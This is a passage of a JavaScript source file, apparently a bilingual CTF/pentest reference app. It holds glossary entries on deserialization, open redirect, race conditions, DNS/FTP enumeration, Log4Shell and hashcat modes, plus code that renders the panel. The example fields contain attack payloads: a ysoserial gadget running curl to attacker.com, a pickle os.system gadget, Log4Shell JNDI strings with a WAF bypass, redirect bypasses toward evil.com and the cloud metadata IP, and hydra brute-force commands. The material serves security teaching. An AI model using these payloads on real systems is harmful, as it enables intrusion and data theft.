    definition: "Vulnérabilité quand une application désérialise des données contrôlées par l'utilisateur sans validation. En Java : gadget chains via ysoserial sur des endpoints qui acceptent des objets Java sérialisés (type de contenu application/x-java-serialized-object, bytes 'AC ED'). En Python : pickle.loads() arbitraire. En PHP : unserialize() avec magic methods (__wakeup, __destruct). Mène souvent à un RCE.",
    definition_en: "Vulnerability when an application deserializes user-controlled data without validation. In Java: gadget chains via ysoserial on endpoints accepting serialized Java objects (content type application/x-java-serialized-object, bytes 'AC ED'). In Python: arbitrary pickle.loads(). In PHP: unserialize() with magic methods (__wakeup, __destruct). Often leads to RCE.",
    example: "# Java - identifier : bytes AC ED 00 05 en base64 = rO0AB\njava -jar ysoserial.jar CommonsCollections6 'curl attacker.com/$(id)' | base64\n# Python pickle :\nimport pickle, os\nclass Exploit(object):\n    def __reduce__(self): return (os.system, ('id',))\npickle.dumps(Exploit())\n# PHP : chercher __wakeup/__destruct dans le code",
    example_en: "# Java - identify: bytes AC ED 00 05 in base64 = rO0AB\njava -jar ysoserial.jar CommonsCollections6 'curl attacker.com/$(id)' | base64\n# Python pickle:\nimport pickle, os\nclass Exploit(object):\n    def __reduce__(self): return (os.system, ('id',))\npickle.dumps(Exploit())\n# PHP: look for __wakeup/__destruct in the code",
    tools: ["ysoserial", "Burp Suite"],
    refs: ["HackTricks Deserialization", "PortSwigger Deserialization"]
  },
  {
    id: "open_redirect", name: "Open Redirect", fullName: "Open Redirect", category: "web",
    aliases: ["Open Redirect", "open redirect", "redirect"],
    definition: "Une URL de l'application redirige vers une destination contrôlée par le paramètre. Utile pour du phishing (URL légitime → site malveillant), contourner des restrictions SSRF, voler des tokens OAuth si le callback redirect_uri est mal validé. Bypass de validation : utiliser // (//attacker.com), @ (target.com@attacker.com), fragments (#), encodage URL.",
    definition_en: "An application URL redirects to a destination controlled by a parameter. Useful for phishing (legitimate URL → malicious site), bypassing SSRF restrictions, stealing OAuth tokens if callback redirect_uri is poorly validated. Validation bypass: use // (//attacker.com), @ (target.com@attacker.com), fragments (#), URL encoding.",
    example: "# Détection :\nhttps://target.com/redirect?url=https://evil.com\nhttps://target.com/redirect?next=/dashboard\n# Bypass :\n?url=//evil.com\n?url=https://target.com@evil.com\n?url=https://evil.com%2F%2Ftarget.com\n# Combo SSRF bypass :\n?url=http://169.254.169.254",
    example_en: "# Detection:\nhttps://target.com/redirect?url=https://evil.com\nhttps://target.com/redirect?next=/dashboard\n# Bypass:\n?url=//evil.com\n?url=https://target.com@evil.com\n?url=https://evil.com%2F%2Ftarget.com\n# SSRF combo bypass:\n?url=http://169.254.169.254",
    tools: ["Burp Suite"],
    refs: ["PortSwigger Open Redirect", "PayloadsAllTheThings Open Redirect"]
  },
  {
    id: "race_condition", name: "Race Condition", fullName: "Race Condition (Web)", category: "web",
    aliases: ["Race Condition", "race condition", "TOCTOU", "time-of-check"],
    definition: "Exploitation d'une fenêtre de temps entre la vérification et l'utilisation d'une ressource (TOCTOU). En web : envoyer plusieurs requêtes simultanées pour exploiter un état intermédiaire (coupon utilisé plusieurs fois, double achat, bypass de limite de tentatives). Technique 'Last-Byte Sync' dans Burp : préparer les requêtes puis envoyer l'octet final simultanément pour maximiser la collision.",
    definition_en: "Exploiting a time window between resource check and use (TOCTOU). In web: send multiple simultaneous requests to exploit an intermediate state (coupon used multiple times, double purchase, attempt limit bypass). 'Last-Byte Sync' technique in Burp: prepare requests then send the final byte simultaneously to maximize collision.",
    example: "# Burp Repeater > Send group in parallel\n# Ou avec Python :\nimport threading, requests\ndef redeem():\n    requests.post('http://TARGET/redeem', data={'coupon':'SAVE50'})\nthreads = [threading.Thread(target=redeem) for _ in range(20)]\n[t.start() for t in threads]\n[t.join() for t in threads]",
    example_en: "# Burp Repeater > Send group in parallel\n# Or with Python:\nimport threading, requests\ndef redeem():\n    requests.post('http://TARGET/redeem', data={'coupon':'SAVE50'})\nthreads = [threading.Thread(target=redeem) for _ in range(20)]\n[t.start() for t in threads]\n[t.join() for t in threads]",
    tools: ["Burp Suite Repeater"],
    refs: ["PortSwigger Race Conditions"]
  },

  // ── Réseau / Recon ──────────────────────────────────────────────────────────
  {
    id: "dns_enum", name: "DNS Enum", fullName: "Énumération DNS", category: "network",
    aliases: ["DNS", "DNS enumeration", "dnsenum", "dnsrecon", "zone transfer", "AXFR", "subfinder", "subdomains"],
    definition: "Cartographie des enregistrements DNS d'un domaine. Techniques : transfert de zone (AXFR = dump complet si mal configuré), bruteforce de sous-domaines, reverse DNS, records SPF/DKIM/DMARC (révèlent infra). Outils : dnsrecon, dnsenum, subfinder, amass. Les sous-domaines trouvés peuvent exposer des applis de développement, panneaux admin, ou services internes.",
    definition_en: "Mapping DNS records of a domain. Techniques: zone transfer (AXFR = full dump if misconfigured), subdomain brute-force, reverse DNS, SPF/DKIM/DMARC records (reveal infrastructure). Tools: dnsrecon, dnsenum, subfinder, amass. Found subdomains may expose dev applications, admin panels, or internal services.",
    example: "# Transfert de zone (souvent non autorisé mais à tester) :\ndig axfr @ns1.target.com target.com\n# Bruteforce sous-domaines :\nffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://TARGET -H 'Host: FUZZ.target.com' -fw 42\nsubfinder -d target.com\n# Enum DNS :\ndnsrecon -d target.com -t axfr,brt\ndnsenum --enum target.com",
    example_en: "# Zone transfer (usually denied but worth testing):\ndig axfr @ns1.target.com target.com\n# Subdomain brute-force:\nffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://TARGET -H 'Host: FUZZ.target.com' -fw 42\nsubfinder -d target.com\n# DNS enum:\ndnsrecon -d target.com -t axfr,brt\ndnsenum --enum target.com",
    tools: ["dnsrecon", "dnsenum", "subfinder", "amass", "ffuf"],
    refs: ["HackTricks DNS"]
  },
  {
    id: "ftp_enum", name: "FTP", fullName: "FTP (File Transfer Protocol)", category: "network",
    aliases: ["FTP", "ftp", "anonymous ftp", "vsftpd", "ProFTPD"],
    definition: "Protocole de transfert de fichiers, port 21 (contrôle) + ports passifs. Vecteurs d'attaque : accès anonyme (user 'anonymous', pass vide ou email), credentials faibles (hydra), versions vulnérables (vsftpd 2.3.4 backdoor → port 6200, ProFTPD 1.3.5 mod_copy). En FTP actif le serveur initie la connexion de données (peut contourner certains firewalls).",
    definition_en: "File transfer protocol, port 21 (control) + passive ports. Attack vectors: anonymous access (user 'anonymous', empty or email password), weak credentials (hydra), vulnerable versions (vsftpd 2.3.4 backdoor → port 6200, ProFTPD 1.3.5 mod_copy). In active FTP the server initiates the data connection (may bypass some firewalls).",
    example: "# Test accès anonyme :\nftp TARGET  # login: anonymous, pass: anything\nnmap -p 21 --script ftp-anon TARGET\n# Versions vulnérables :\nnmap -sV -p 21 TARGET\n# vsftpd 2.3.4 backdoor :\nuse exploit/unix/ftp/vsftpd_234_backdoor\n# Brute force :\nhydra -l admin -P rockyou.txt ftp://TARGET",
    example_en: "# Test anonymous access:\nftp TARGET  # login: anonymous, pass: anything\nnmap -p 21 --script ftp-anon TARGET\n# Vulnerable versions:\nnmap -sV -p 21 TARGET\n# vsftpd 2.3.4 backdoor:\nuse exploit/unix/ftp/vsftpd_234_backdoor\n# Brute force:\nhydra -l admin -P rockyou.txt ftp://TARGET",
    tools: ["nmap", "hydra", "Metasploit"],
    refs: ["HackTricks FTP"]
  },

  // ── Outils CTF / Forensics ──────────────────────────────────────────────────
  {
    id: "log4shell", name: "Log4Shell", fullName: "Log4Shell (CVE-2021-44228)", category: "exploit",
    aliases: ["Log4Shell", "Log4j", "CVE-2021-44228", "JNDI injection"],
    definition: "Vulnérabilité critique (CVSS 10.0) dans la librairie Java Log4j2 (versions 2.0-beta9 à 2.14.1). L'injection de la chaîne ${jndi:ldap://attacker.com/a} dans n'importe quel champ loggé (User-Agent, X-Forwarded-For, username...) déclenche une lookup JNDI → charge une classe Java distante → RCE. Impact massif car Log4j est omniprésent dans l'écosystème Java.",
    definition_en: "Critical vulnerability (CVSS 10.0) in the Java Log4j2 library (versions 2.0-beta9 to 2.14.1). Injecting the string ${jndi:ldap://attacker.com/a} into any logged field (User-Agent, X-Forwarded-For, username...) triggers a JNDI lookup → loads a remote Java class → RCE. Massive impact because Log4j is ubiquitous in the Java ecosystem.",
    example: "# Test avec interactsh ou Burp Collaborator :\ncurl -H 'User-Agent: ${jndi:ldap://YOUR_BURP_COLLAB/a}' http://TARGET\n# Payload dans tous les headers :\n${jndi:ldap://attacker.com/${java:version}}\n# Bypass WAF :\n${${::-j}${::-n}${::-d}${::-i}:ldap://attacker.com/a}\n# Exploitation avec marshalsec :\njava -cp marshalsec.jar marshalsec.jndi.LDAPRefServer 'http://attacker.com/#Exploit'",
    example_en: "# Test with interactsh or Burp Collaborator:\ncurl -H 'User-Agent: ${jndi:ldap://YOUR_BURP_COLLAB/a}' http://TARGET\n# Payload in all headers:\n${jndi:ldap://attacker.com/${java:version}}\n# WAF bypass:\n${${::-j}${::-n}${::-d}${::-i}:ldap://attacker.com/a}\n# Exploitation with marshalsec:\njava -cp marshalsec.jar marshalsec.jndi.LDAPRefServer 'http://attacker.com/#Exploit'",
    tools: ["Burp Suite Collaborator", "marshalsec"],
    refs: ["CVE-2021-44228", "github.com/welk1n/JNDI-Injection-Exploit"]
  },
  {
    id: "john_formats", name: "John/Hashcat modes", fullName: "John the Ripper — Formats de hashes courants", category: "tool",
    aliases: ["john formats", "hashcat modes", "hash modes", "hashcat -m"],
    definition: "Référence des modes hashcat (-m) et formats john (--format) les plus courants en CTF et pentest. Identifier le hash avec hash-identifier ou hashid avant de lancer le crack. Wordlists recommandées : rockyou.txt, SecLists. Règles : --rules=best64 (john), -r /usr/share/hashcat/rules/best64.rule (hashcat).",
    definition_en: "Reference for the most common hashcat modes (-m) and john formats (--format) in CTF and pentesting. Identify the hash with hash-identifier or hashid before cracking. Recommended wordlists: rockyou.txt, SecLists. Rules: --rules=best64 (john), -r /usr/share/hashcat/rules/best64.rule (hashcat).",
    example: "# Modes hashcat courants :\n-m 0     MD5\n-m 100   SHA1\n-m 1400  SHA256\n-m 1700  SHA512\n-m 1000  NTLM\n-m 5600  NTLMv2 (Responder)\n-m 1800  sha512crypt ($6$) Linux\n-m 500   md5crypt ($1$) Linux\n-m 3200  bcrypt ($2b$)\n-m 13100 Kerberoast (TGS)\n-m 18200 AS-REP Roast\n-m 16500 JWT\n# Formats john :\njohn hash.txt --format=NT\njohn hash.txt --format=sha512crypt --wordlist=rockyou.txt",
    example_en: "# Common hashcat modes:\n-m 0     MD5\n-m 100   SHA1\n-m 1400  SHA256\n-m 1700  SHA512\n-m 1000  NTLM\n-m 5600  NTLMv2 (Responder)\n-m 1800  sha512crypt ($6$) Linux\n-m 500   md5crypt ($1$) Linux\n-m 3200  bcrypt ($2b$)\n-m 13100 Kerberoast (TGS)\n-m 18200 AS-REP Roast\n-m 16500 JWT\n# John formats:\njohn hash.txt --format=NT\njohn hash.txt --format=sha512crypt --wordlist=rockyou.txt",
    tools: ["hashcat", "john", "hash-identifier"],
    refs: ["hashcat.net/wiki/doku.php?id=hashcat", "openwall.com/john"]
  }
];

// Index de recherche rapide : tous les aliases en minuscules → id du terme
const TERM_INDEX = {};
GLOSSARY.forEach(term => {
  [term.name, term.fullName, ...(term.aliases || [])].forEach(alias => {
    TERM_INDEX[alias.toLowerCase()] = term.id;
  });
});

// ─── Panel State ──────────────────────────────────────────────────────────────

let docsOpen = false;
let docsCurrentId = null;
let docsFilter = "";
let docsCategoryFilter = "";

// ─── Toggle ───────────────────────────────────────────────────────────────────

function toggleDocs(termId) {
  const panel = document.getElementById("docs-panel");
  const overlay = document.getElementById("docs-overlay");

  if (docsOpen && !termId) {
    docsOpen = false;
    panel.classList.remove("open");
    overlay.classList.add("hidden");
    return;
  }

  docsOpen = true;
  panel.classList.add("open");
  overlay.classList.remove("hidden");

  if (termId) {
    docsCurrentId = termId;
    renderDocDetail(termId);
    renderDocList();
  } else {
    docsCurrentId = null;
    renderDocList();
    renderDocDetail(null);
  }
}

function closeDocs() {
  docsOpen = false;
  document.getElementById("docs-panel").classList.remove("open");
  document.getElementById("docs-overlay").classList.add("hidden");
}

// ─── Render List ──────────────────────────────────────────────────────────────

function renderDocList() {
  const q = docsFilter.toLowerCase();
  const cat = docsCategoryFilter;

  const filtered = GLOSSARY.filter(t => {
    const matchCat = !cat || t.category === cat;
    const def = (LANG === "en" && t.definition_en) ? t.definition_en : t.definition;
    const matchQ = !q || t.name.toLowerCase().includes(q) ||
      t.fullName.toLowerCase().includes(q) ||
      def.toLowerCase().includes(q) ||
      (t.aliases || []).some(a => a.toLowerCase().includes(q));
    return matchCat && matchQ;
  });

  const list = document.getElementById("docs-list");
  if (!list) return;

  // Group by category
  const cats = {};
  filtered.forEach(t => {
    if (!cats[t.category]) cats[t.category] = [];
    cats[t.category].push(t);
  });

  const CAT_LABELS = {
    web: t("docs.cat.web"), exploit: t("docs.cat.exploit"), network: t("docs.cat.network"),
    privesc: t("docs.cat.privesc"), tool: t("docs.cat.tool"), ctf: t("docs.cat.ctf"),
    general: t("docs.cat.general")
  };

  list.innerHTML = Object.entries(cats).map(([cat, terms]) => `
    <div class="docs-group">
      <div class="docs-group-label">${CAT_LABELS[cat] || cat}</div>
      ${terms.map(t => `
        <button class="docs-list-item ${docsCurrentId === t.id ? 'active' : ''}"
                onclick="selectDocTerm('${t.id}')">
          <span class="docs-item-name">${escHtml(t.name)}</span>
          <span class="docs-item-full">${escHtml(t.fullName)}</span>
        </button>
      `).join("")}
    </div>
  `).join("") || `<div class="docs-no-result">${t("docs.noresult")} "${escHtml(docsFilter)}"</div>`;
}

function selectDocTerm(id) {
  docsCurrentId = id;
  renderDocDetail(id);
  renderDocList();
  document.getElementById("docs-detail").scrollTop = 0;
}

// ─── Render Detail ────────────────────────────────────────────────────────────

function refToLink(r) {
  // Domain/URL pattern: no spaces, contains a dot
  if (!/\s/.test(r) && /\./.test(r)) {
    const href = /^https?:\/\//.test(r) ? r : `https://${r}`;
    return `<a href="${escHtml(href)}" target="_blank" rel="noopener noreferrer" class="docs-ref-link">${escHtml(r)}</a>`;
  }
  return escHtml(r);
}

function renderDocDetail(id) {
  const detail = document.getElementById("docs-detail");
  if (!id) {
    detail.innerHTML = `<div class="docs-placeholder">
      <div class="docs-placeholder-icon">📚</div>
      <p>${t("docs.placeholder")}</p>
    </div>`;
    return;
  }
  const term = GLOSSARY.find(x => x.id === id);
  if (!term) return;

  const style = getCategoryStyle(term.category);
  const def = LANG === "en" && term.definition_en ? term.definition_en : term.definition;
  const example = LANG === "en" && term.example_en ? term.example_en : term.example;
  const toolsHtml = term.tools?.length
    ? `<div class="docs-section"><h4>${t("docs.tools")}</h4><div class="docs-tags">${term.tools.map(x => `<span class="docs-tag">${escHtml(x)}</span>`).join("")}</div></div>`
    : "";
  const refsHtml = term.refs?.length
    ? `<div class="docs-section"><h4>${t("docs.refs")}</h4><ul>${term.refs.map(r => `<li>${refToLink(r)}</li>`).join("")}</ul></div>`
    : "";

  detail.innerHTML = `
    <div class="docs-detail-header" style="border-left:4px solid ${style.badge}">
      <div><span class="docs-detail-badge" style="background:${style.badge}">${escHtml(term.category.toUpperCase())}</span></div>
      <h2 class="docs-detail-name">${escHtml(term.name)}</h2>
      <p class="docs-detail-fullname">${escHtml(term.fullName)}</p>
    </div>
    <div class="docs-section">
      <h4>${t("docs.definition")}</h4>
      <p>${escHtml(def)}</p>
    </div>
    <div class="docs-section">
      <h4>${t("docs.example")}</h4>
      <pre class="docs-example">${escHtml(example)}</pre>
    </div>
    ${toolsHtml}
    ${refsHtml}
  `;
}

// ─── Détection de termes dans un nœud ─────────────────────────────────────────

function getNodeTerms(node) {
  const text = [
    node.title, node.description,
    ...(node.commands || []).map(c => c.label + " " + c.cmd),
    ...(node.lookfor || []),
    ...(node.tips || [])
  ].join(" ").toLowerCase();

  const found = new Set();
  GLOSSARY.forEach(term => {
    const aliases = [term.name, ...(term.aliases || [])];
    if (aliases.some(a => text.includes(a.toLowerCase()))) {
      found.add(term.id);
    }
  });
  return [...found].map(id => GLOSSARY.find(t => t.id === id)).filter(Boolean);
}

function renderRelatedTerms(node) {
  const terms = getNodeTerms(node);
  if (terms.length === 0) return "";
  return `<div class="section related-terms-section">
    <h3><span class="section-icon">📚</span> ${t("docs.related")}</h3>
    <div class="related-terms-grid">
      ${terms.map(t => {
        const style = getCategoryStyle(t.category);
        return `<button class="related-term-btn" style="border-color:${style.border}" onclick="toggleDocs('${t.id}')">
          <span class="rt-name">${escHtml(t.name)}</span>
          <span class="rt-full">${escHtml(t.fullName)}</span>
        </button>`;
      }).join("")}
    </div>
  </div>`;
}

// ─── Filtres ──────────────────────────────────────────────────────────────────

function docsSearch(q) {
  docsFilter = q;
  renderDocList();
}

function docsCatFilter(cat) {
  docsCategoryFilter = cat === docsCategoryFilter ? "" : cat;
  renderDocList();
  // Update active state on buttons
  document.querySelectorAll(".docs-cat-btn").forEach(btn => {
    btn.classList.toggle("active", btn.dataset.cat === docsCategoryFilter);
  });
}
